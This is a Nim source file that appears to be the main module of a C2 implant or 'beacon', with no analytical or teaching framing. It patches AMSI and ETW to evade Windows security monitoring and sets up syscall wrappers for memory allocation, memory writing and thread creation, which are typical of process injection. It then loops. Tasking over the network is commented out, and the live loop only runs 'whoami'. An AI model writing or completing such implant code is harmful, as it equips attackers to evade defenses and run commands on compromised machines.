import os, json, strformat
import utils, comms, config
proc main() =
    discard PatchAMSI()
    echo "ASMI done!"
    discard PathETW()
    echo "ETW done!"

    makeNtAllocateVirtualMemory()
    makeNtWriteVirtualMemory()
    makeNtCreateThreadEx()
  
    randomize()

    let agentID = genID()
    echo fmt"[+] Beacon started with ID {agentID}"

    while true:
        echo "[*] Sending checkin..."
      #let response = sendCheckin(agentID) #response of the post request made to endpoint , contains (task_id,cmd)

      #if response.len > 0:
        #let rawtask = decryptJson(response,AES_KEY)
        #let parsedtask = parseTask(rawtask)
        #let output = execProcess(parsedtask.command)
        #echo output
        #discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
      #randomSleep(SLEEP_MIN, SLEEP_MAX)
        var output = execProcess("whoami")
        echo output
      
when isMainModule:
  main()
